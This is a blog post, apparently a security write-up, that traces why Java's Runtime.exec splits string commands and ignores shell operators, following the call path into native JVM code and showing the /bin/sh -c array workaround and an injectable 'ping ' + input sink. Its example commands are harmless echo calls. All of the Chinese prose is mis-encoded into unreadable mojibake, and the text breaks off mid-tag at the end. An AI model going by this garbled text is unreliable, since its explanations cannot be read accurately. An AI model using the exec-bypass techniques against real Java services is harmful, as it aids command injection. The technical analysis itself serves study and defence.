    <content type="html"><![CDATA[<!-- è¿™ç¯‡æ–‡ç« ä¸»è¦ç›®çš„åœ¨äºå­¦ä¹ å‰äººæ–‡ç« ï¼Œå¹¶ä»æ›´æ·±å…¥ä¸€ç‚¹çš„è§’åº¦æ¢è®¨ä¸ºä»€ä¹ˆRuntime.getRuntime().execæŸäº›æ—¶å€™ä¼šå¤±æ•ˆè¿™ä¸ªé—®é¢˜ã€‚ --><!-- more --><p>æœ¬æ–‡å‘åœ¨<a href="https://xz.aliyun.com/t/7046">å…ˆçŸ¥ç¤¾åŒº</a>ï¼Œè½¬è½½åˆ°è‡ªå·±åšå®¢ä¸Šã€‚</p><h2 id="é—®é¢˜å¤ç°"><a href="#é—®é¢˜å¤ç°" class="headerlink" title="é—®é¢˜å¤ç°"></a>é—®é¢˜å¤ç°</h2><p>æµ‹è¯•ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"cmd which you want to exec"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹å¯ä»¥æˆåŠŸçš„æƒ…å†µ<br><img src="1577676465197-1f34563e-7443-4f6c-9238-c0137558519e.png#align=left&display=inline&height=232&name=image.png&originHeight=464&originWidth=2472&size=112349&status=done&style=none&width=1236" alt="image.png"></p><p>å†æ¥çœ‹çœ‹ä¸èƒ½æˆåŠŸçš„æƒ…å†µ<br><img src="1577676563293-bef3ec10-84d5-4aa5-95b7-bec57b95d23e.png#align=left&display=inline&height=160&name=image.png&originHeight=320&originWidth=2354&size=88578&status=done&style=none&width=1177" alt="image.png"></p><p>è¿™é‡Œ <code>&amp;&amp;</code> å¹¶æ²¡æœ‰è¾¾åˆ°bashä¸­çš„æ•ˆæœ<br><img src="1577676687805-0c7e43fb-9d1d-4aa8-8ef6-7331003c1499.png#align=left&display=inline&height=82&name=image.png&originHeight=122&originWidth=1110&size=51524&status=done&style=none&width=746" alt="image.png"></p><p>å¦‚æœä»¥å‰æœ‰äººé—®æˆ‘ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§ï¼Œæˆ‘ä¼šæ¯«ä¸çŠ¹è±«çš„å›ç­”ï¼š<em>å› ä¸º <code>Runtime.getRuntime().exec</code>   æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å¹¶æ²¡æœ‰shellä¸Šä¸‹æ–‡ç¯å¢ƒæ‰€ä»¥æ— æ³•æŠŠç±»ä¼¼äº <code>&amp;</code> <code>|</code> è¿™æ ·çš„ç¬¦å·è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚</em></p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>è§£å†³è¿™ç§é—®é¢˜çš„æ–¹æ³•æœ‰ä¸¤ç§<br>ç¬¬ä¸€ç§å°±æ˜¯å¯¹æ‰§è¡Œå‘½ä»¤è¿›è¡Œç¼–ç ï¼Œ<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">ç¼–ç åœ°å€åœ¨è¿™</a></p><p><img src="1577679919272-65599375-f5c5-4dd0-99fb-eae32d71c6fe.png#align=left&display=inline&height=378&name=image.png&originHeight=646&originWidth=1274&size=50358&status=done&style=none&width=746" alt="image.png"><br><img src="1577679973496-15f40fac-cdbc-48c5-a23c-63385bf3775e.png#align=left&display=inline&height=162&name=image.png&originHeight=324&originWidth=3298&size=104504&status=done&style=none&width=1649" alt="image.png"></p><p>ç¬¬äºŒç§å°±æ˜¯ä½¿ç”¨æ•°ç»„çš„å½¢å¼å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] command = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 2333 2333 &amp;&amp; echo 2333 2333 2333"</span> &#125;;</span><br><span class="line">InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br></pre></td></tr></table></figure><p><img src="1577680147954-a2e442b8-dd8c-42c4-a578-41d879554491.png#align=left&display=inline&height=229&name=image.png&originHeight=458&originWidth=2918&size=146723&status=done&style=none&width=1459" alt="image.png"></p><p>è‡³æ­¤ä»å®æˆ˜åº”ç”¨çš„è§’åº¦è¿™ä¸ªé—®é¢˜å·²ç»è§£å†³äº†ã€‚</p><p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å®è¿™ç¬¬äºŒç§æ–¹æ³•ç”¨åˆ°äº† <code>&amp;</code> ä¸Šé¢ _Runtime.getRuntime().execæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å¹¶æ²¡æœ‰shellä¸Šä¸‹æ–‡ç¯å¢ƒæ‰€ä»¥æ— æ³•æŠŠç±»ä¼¼äº <code>&amp;</code> <code>|</code> <em>`</em><code>_</code> _è¿™æ ·çš„ç¬¦å·ç‰¹æ®Šå¤„ç†ã€‚_è¿™ä¸€ç»“è®ºä¼¼ä¹çœ‹èµ·æ¥å¹¶ç«™ä¸ä½è„š?</p><p>ä¸‹é¢æ¥è·Ÿè¸ªä¸€ä¸‹æºç ï¼Œçœ‹çœ‹åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><h3 id="å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²"><a href="#å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²" class="headerlink" title="å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²"></a>å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"echo 2333 &amp;&amp; echo 2333"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¼ å…¥çš„å‘½ä»¤æ˜¯Stringç±»å‹ï¼Œæ‰€ä»¥è¿›å…¥ <code>java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File)</code>  ã€‚<strong>è¿™é‡Œæ˜¯ç¬¬ä¸€ä¸ªéå¸¸å…³é”®çš„ç‚¹ï¼Œ <code>StringTokenizer</code> ä¼šæŠŠä¼ å…¥çš„conmmandå­—ç¬¦ä¸²æŒ‰ <code>\t \n \r \f</code> ä¸­çš„ä»»æ„ä¸€ä¸ªåˆ†å‰²æˆæ•°ç»„cmdarrayã€‚</strong></p><p><img src="1577685833249-067f99be-c43e-4564-a18f-a47a6856861a.png#align=left&display=inline&height=211&name=image.png&originHeight=422&originWidth=2766&size=176007&status=done&style=none&width=1383" alt="image.png"><br><img src="1577686182902-31dc960d-5d35-42a5-8803-079771cf19b3.png#align=left&display=inline&height=186&name=image.png&originHeight=228&originWidth=916&size=22796&status=done&style=none&width=746" alt="image.png"></p><p>ä»£ç æ¥åˆ°execçš„å¤šæ€å®ç° <code>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</code> ï¼Œexecå†…éƒ¨è°ƒç”¨äº†ProcessBuilderçš„startã€‚<br><img src="1577686458188-5644d174-4a9f-4a06-a666-eb66296ce4d5.png#align=left&display=inline&height=130&name=image.png&originHeight=260&originWidth=1816&size=61763&status=done&style=none&width=908" alt="image.png"></p><p>ProcessBuilder.startå†…éƒ¨åˆè°ƒç”¨äº†ProcessImpl.startã€‚<br><img src="1577686661547-d787e724-269b-4a25-95c6-1a87412d7e97.png#align=left&display=inline&height=127&name=image.png&originHeight=254&originWidth=2602&size=71237&status=done&style=none&width=1301" alt="image.png"></p><p>åœ¨ProcessImpl.startä¸­æœ‰<strong>ç¬¬äºŒä¸ªéå¸¸å…³é”®çš„ç‚¹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºæŠŠcmdarrayç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆcmdarray[0]ï¼‰å½“æˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ŒæŠŠå…¶åçš„éƒ¨åˆ†ï¼ˆcmdarray[1:]ï¼‰ä½œä¸ºå‘½ä»¤çš„å‚æ•°è½¬æ¢æˆbyte æ•°ç»„ argBlockï¼ˆå…·ä½“è§„åˆ™æ˜¯ä»¥\x00è¿›è¡Œimplodeï¼‰ã€‚</strong><br><img src="1577687523856-aadd2b68-7973-4b49-a857-d554004c8f6e.png#align=left&display=inline&height=487&name=image.png&originHeight=974&originWidth=2514&size=281837&status=done&style=none&width=1257" alt="image.png"></p><p>ProcessImpl.startæœ€ååˆä¼šæŠŠå¤„ç†å¥½çš„å‚æ•°ä¼ å…¥UNIXProcess<br><img src="1577686887031-96670a59-cdca-4cf1-ad79-ee82474a18bb.png#align=left&display=inline&height=156&name=image.png&originHeight=312&originWidth=2602&size=86125&status=done&style=none&width=1301" alt="image.png"></p><p>UNIXProcesså†…éƒ¨åˆè°ƒç”¨äº†forkAndExecæ–¹æ³•<br><img src="1577688234642-21446af8-71dc-42ef-a9a4-d4f549399445.png#align=left&display=inline&height=312&name=image.png&originHeight=624&originWidth=2776&size=186773&status=done&style=none&width=1388" alt="image.png"></p><p>è¿™é‡Œçš„æ˜¯forkAndExecæ˜¯ä¸€ä¸ªnativeæ–¹æ³•ã€‚<br><img src="1577686970789-da810849-80d9-4eb2-b107-7bb1ce933b0f.png#align=left&display=inline&height=155&name=image.png&originHeight=310&originWidth=1994&size=74399&status=done&style=none&width=997" alt="image.png"></p><p>ä»å˜é‡çš„å‘½åæ¥çœ‹ï¼Œåœ¨å¼€å‘è€…çš„çœ¼ä¸­progæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤å³ <code>echo</code> ï¼ŒargBlockéƒ½æ˜¯ä¼ ç»™ <code>echo</code> çš„å‚æ•°å³<code>2333\x00&amp;&amp;\x002333</code>ä¸”ä¼ ç»™ <code>echo</code> çš„å‚æ•°ä¸ªæ•°argcæ˜¯4<br>å¯è§ç»è¿‡StringTokenizerå¯¹å­—ç¬¦ä¸²ä¸­ç©ºæ ¼ç±»çš„å¤„ç†å…¶å®æ˜¯ä¸€ç§javaå¯¹å‘½ä»¤æ‰§è¡Œçš„ä¿æŠ¤æœºåˆ¶ï¼Œä»–å¯ä»¥é˜²å¾¡ä»¥ä¸‹è¿™ç§å‘½ä»¤æ³¨å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = <span class="string">"ping "</span> + å¯æ§ç‚¹;</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>è¡¥ä¸€ä¸ªå®Œæ•´çš„è°ƒç”¨æ ˆã€‚<img src="1577687207316-a29ab55a-281b-4cd5-b8df-d35c5038dbb5.png#align=left&display=inline&height=200&name=image.png&originHeight=288&originWidth=1076&size=49512&status=done&style=none&width=746" alt="image.png"></p><h3 id="å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„"><a href="#å½“ä¼ å…¥Runtime-getRuntime-execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„" class="headerlink" title="å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„"></a>å½“ä¼ å…¥Runtime.getRuntime().execçš„æ˜¯å­—ç¬¦ä¸²æ•°ç»„</h3><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹ç»™Runtimeä¼ å…¥æ•°ç»„çš„æ—¶å€™æ˜¯ä»€ä¹ˆæƒ…å†µã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> throws IOException </span>&#123;</span><br><span class="line">        String[] command = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 &amp;&amp; echo 2333"</span> &#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        byte[] b = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != <span class="number">-1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œä¼ å…¥çš„æ•°ç»„ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰ç»StringTokenizerå¯¹å­—ç¬¦ä¸²çš„åˆ†å‰²å¤„ç†è¿™ä¸€æ­¥è€Œæ˜¯ç›´æ¥è¿›å…¥äº†ã€‚<code>java.lang.Runtime#exec(java.lang.String[])</code> ã€‚<br><img src="1577689013179-27759f7d-39b7-453c-883c-674de2de614d.png#align=left&display=inline&height=75&name=image.png&originHeight=150&originWidth=2222&size=51052&status=done&style=none&width=1111" alt="image.png"></p><p>åé¢çš„æµç¨‹å’Œå­—ç¬¦ä¸²çš„æƒ…å½¢æ˜¯ä¸€è‡´çš„ï¼Œæœ€åæ¥åˆ°forkAndExec<br><img src="1577689204761-132deaef-3c15-4894-8d8f-bc307ff0de8e.png#align=left&display=inline&height=318&name=image.png&originHeight=636&originWidth=2828&size=191238&status=done&style=none&width=1414" alt="image.png"></p><p>æŒ‰ç…§ä¸Šé¢çš„è¯´æ³•è¿™é‡Œ <code>/bin/bash</code> æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œ <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> æ˜¯ä¼ ç»™çš„ <code>/bin/bash</code> çš„å‚æ•°ã€‚</p><p>è¡¥ä¸€ä¸ªè°ƒç”¨æ ˆ<br><img src="1577891037047-1a96c772-57d2-4476-93b4-3460b8ea60b1.png#align=left&display=inline&height=129&name=image.png&originHeight=258&originWidth=1074&size=43587&status=done&style=none&width=537" alt="image.png"></p><h3 id="ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•"><a href="#ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•" class="headerlink" title="ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•"></a>ä¸€ä¸ªé”™è¯¯çš„æƒ³æ³•</h3><p>çœ‹åˆ°è¿™é‡Œä¸çŸ¥é“ä½ æ˜¯ä¸æ˜¯æœ‰ç‚¹æ™•ï¼Œå¿ƒåº•ç”Ÿå‡ºäº†ç–‘é—®ï¼Œåœ¨æ‰§è¡Œå­—ç¬¦ä¸²çš„æ—¶å€™åŠ ä¸Š <code>/bin/bash</code> ä¸å°±å¥½äº†ã€‚åƒä¸‹é¢è¿™æ ·ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">linux_cmd1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"/bin/bash -c 'echo 2333 &amp;&amp; echo 2333'"</span>;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¯•è¯•çœ‹ï¼Œå‘ç°ä»€ä¹ˆç»“æœéƒ½æ²¡æœ‰ï¼Œæ¨æµ‹åº”è¯¥æ˜¯shellæ‰§è¡Œå‘½ä»¤å¤±è´¥äº†ã€‚<br><img src="1577690492437-eb933d61-d2b5-4175-94e8-2707f0a04a80.png#align=left&display=inline&height=302&name=image.png&originHeight=604&originWidth=2076&size=124786&status=done&style=none&width=1038" alt="image.png"></p><p>ä¸ºä»€ä¹ˆä¼šå¤±è´¥å‘¢ï¼Ÿæˆ‘ä»¬æ¥diffä¸€ä¸‹å’Œæ•°ç»„æ‰§è¡Œæœ€åè¿›nativeçš„å±‚çš„åŒºåˆ«ã€‚<br><img src="1577695145401-bada57bf-0499-4f8c-b33f-1d240cd142af.png#align=left&display=inline&height=774&name=image.png&originHeight=1548&originWidth=2786&size=270657&status=done&style=none&width=1393" alt="image.png"><br>å¯ä»¥çœ‹åˆ°progéƒ½æ˜¯ <code>/bin/bash</code> ä½†æ˜¯å­—ç¬¦ä¸²æ¨¡å¼ä¸‹æ‰§è¡Œçš„å‚æ•°å˜æˆäº† <code>-c\x00&#39;echo\x002333\x00&amp;&amp;\x00echo\x002333&#39;</code> ï¼Œå¯¹æ¯”æ•°ç»„æ¨¡å¼ <code>-c\x00&quot;echo 2333 &amp;&amp; echo 23333&quot;</code> ã€‚å¯ä»¥å‘ç°å­—ç¬¦ä¸²æ¨¡å¼ä¸‹å› ä¸º<code>StringTokenizer</code>å¯¹å­—ç¬¦ä¸²ç©ºæ ¼ç±»å­—ç¬¦çš„å¤„ç†<strong>ç ´åäº†å‘½ä»¤æ‰§è¡Œçš„è¯­ä¹‰</strong>ã€‚</p><p>å¦‚æœå†ä»”ç»†çœ‹çœ‹ä¼šå‘ç°å­—ç¬¦ä¸²æ¨¡å¼argcä¸º6è€Œæ•°ç»„æ¨¡å¼åªæœ‰2ã€‚å†™åˆ°è¿™é‡Œå…¶å®æˆ‘è¿˜æƒ³é’»ä»¥ä¸‹ç‰›è§’å°–ï¼Œå‡­ä»€ä¹ˆ6ä¸ªå‚æ•°æœ€åå°±ä¸èƒ½æ‰§è¡Œï¼Ÿ</p><h3 id="è¿›å…¥jvmçœ‹çœ‹"><a href="#è¿›å…¥jvmçœ‹çœ‹" class="headerlink" title="è¿›å…¥jvmçœ‹çœ‹"></a>è¿›å…¥jvmçœ‹çœ‹</h3><p>å¸¦ç€è¿™æ ·çš„ç–‘é—®ï¼Œæˆ‘è‡ªä¸é‡åŠ›çš„ç¼–è¯‘äº†javaæºç å¹¶ç°å­¦äº†ä¸€ä¸‹æ€ä¹ˆè°ƒè¯•jvmï¼ˆè°ƒè¯•çš„ç¯å¢ƒæ˜¯ubuntu14.04+jdk8ï¼‰ä¸‹é¢æ˜¯å­¦ä¹ æˆæœã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String[] command = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"echo 2333 &amp;&amp; echo 2333"</span> &#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®java nativeå‡½æ•°å‘½åè§„åˆ™å¯ä»¥çŸ¥é“forkAndExecå¯¹åº”çš„cå‡½æ•°æ˜¯ <code>Java_java_lang_UNIXProcess_forkAndExec</code>  ã€‚<br><img src="1577891334880-c3954fc0-353f-4e3a-93d2-c05a22a1805b.png#align=left&display=inline&height=762&name=image.png&originHeight=1524&originWidth=1826&size=284743&status=done&style=none&width=913" alt="image.png"></p><p>è¿™ä¸ªå‡½æ•°åˆå§‹åŒ–æ‰§è¡Œå‘½ä»¤æ‰€éœ€è¦ä¸€äº›å˜é‡ï¼ˆå¦‚è¾“å…¥è¾“å‡ºé”™è¯¯æµï¼‰ä»¥åŠæå–å¹¶å¤„ç†javaä¼ å…¥è¿›æ¥çš„å‚æ•°ï¼Œæœ€åè°ƒç”¨startChildå‡½æ•°å¼€å¯å­è¿›ç¨‹ã€‚</p><p><img src="1577803126319-c17c1625-54d4-4a06-b2f4-f3e2d69f0912.png#align=left&display=inline&height=738&name=image.png&originHeight=1476&originWidth=2068&size=1476544&status=done&style=none&width=1034" alt="image.png"></p><p>startChildä¼šæ ¹æ®æ˜¯modeçš„æ•°å€¼ä¸åŒè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œmodeç”±æ“ä½œç³»ç»Ÿã€libcç‰ˆæœ¬å†³å®šã€‚<br><img src="1577891592795-27719e34-85b1-49fb-94b9-6fbbb4bd7a4b.png#align=left&display=inline&height=640&name=image.png&originHeight=1280&originWidth=1956&size=187639&status=done&style=none&width=978" alt="image.png"></p><p>æˆ‘è¿™é‡Œè¿›å…¥äº†vforkChildï¼ŒvforkChildä¼šä½¿ç”¨vforkå¼€å¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¹¶ä¸”åœ¨å­è¿›ç¨‹å†…éƒ¨è°ƒç”¨äº†childProcessï¼Œåœ¨clionä¸­ä¸ºäº†è°ƒè¯•è¿›å…¥å­è¿›ç¨‹éœ€è¦åœ¨è¿›å…¥ä¹‹å‰åœ¨gdbè°ƒè¯•æ¡†è¾“å…¥ <code>set follow-fork-mode child</code>  å’Œ <code>set detach-on-fork off</code><br><img src="1577886759874-01492158-3589-42ae-8468-8ba3629cc2bc.png#align=left&display=inline&height=744&name=image.png&originHeight=1488&originWidth=1922&size=234923&status=done&style=none&width=961" alt="image.png"></p><p>childProcessä¸­è°ƒç”¨JDK_execvpeã€‚<br><img src="1577892301729-741292b7-cee1-4ed8-9ce9-72fec7fc5783.png#align=left&display=inline&height=685&name=image.png&originHeight=1370&originWidth=1596&size=183821&status=done&style=none&width=798" alt="image.png"><br>JDK_execvpeæœ€åè°ƒç”¨ç³»ç»Ÿexecvpå‡½æ•°ï¼Œæˆ‘ä»¬æ¥ç»†ä¸€çœ‹ä¼ å‚æƒ…å†µã€‚</p><p><img src="1577886891144-925b1102-3c6f-4752-b0ba-b5b94d1def00.png#align=left&display=inline&height=452&name=image.png&originHeight=904&originWidth=1838&size=123585&status=done&style=none&width=919" alt="image.png"></p><p><img src="1577887135995-42990dc8-ec02-401e-9213-eddf7e418801.png#align=left&display=inline&height=213&name=image.png&originHeight=356&originWidth=1246&size=39821&status=done&style=none&width=746" alt="image.png"></p><p><img 